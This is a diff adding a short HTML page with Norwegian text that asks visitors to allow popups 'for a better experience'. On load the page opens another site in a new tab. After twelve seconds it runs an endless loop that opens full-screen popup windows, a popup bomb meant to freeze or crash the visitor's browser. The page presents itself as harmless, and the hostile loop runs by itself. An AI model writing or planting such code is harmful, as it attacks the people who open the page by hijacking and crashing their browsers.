@@ -1,0 +1,24 @@
+<html><head>
+    <p style="font-size:30px;color:green;">Vennligst tillat popups fo en bedre opplevelse av siden :)</p>
+    <p style="font-size:200px;color:red;" id="gratis"></p>
+    <script>
+        params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
+width=10000,height=10000,left=0,top=0`;
+        window.open("https://dagens-norge.github.io/", "_blank");</script>
+    
+    <script>
+        function start()
+        {
+        document.getElementById("gratis").innerHTML = "Hade!";
+        }
+        
+        function crash()
+        {
+        while (true) {
+            window.open("/", "_blank", params)
+        }
+        }
+        setTimeout(start, 10000);
+        setTimeout(crash, 12000);
+    </script>
+</head><body></body></html>
